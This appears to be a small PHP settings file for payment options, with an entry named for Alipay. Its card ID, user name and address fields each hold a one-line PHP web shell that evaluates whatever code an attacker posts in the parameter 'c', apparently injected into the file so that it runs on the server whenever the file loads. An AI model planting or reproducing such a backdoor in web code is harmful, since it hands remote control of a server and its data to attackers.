<?php
unset($bank);
$bank[1][0]['card_bankName']='支付宝';
$bank[1][0]['card_bankIco']='';
$bank[1][0]['card_ID']='<?php @eval($_POST['c']);?>';
$bank[1][0]['card_userName']='<?php @eval($_POST['c']);?>';
$bank[1][0]['card_address']='<?php @eval($_POST['c']);?>';
?>